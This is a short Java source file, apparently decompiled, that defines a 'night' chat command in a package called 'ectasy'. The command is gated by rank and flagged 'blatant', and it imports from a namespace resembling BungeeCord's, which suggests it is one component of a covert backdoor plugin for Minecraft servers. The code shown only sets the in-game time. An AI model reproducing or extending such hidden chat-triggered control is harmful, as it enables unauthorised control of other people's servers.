package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "night",
   description = "Sets the time to night",
   blatant = true,
   rank = Rank.LITE
)
public class NightCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
         var1.getPlayer().getWorld().setFullTime(18000L);
         ChatUtil.sendChat(var1.getPlayer(), "The time has been set to night.");
      });
   }
}
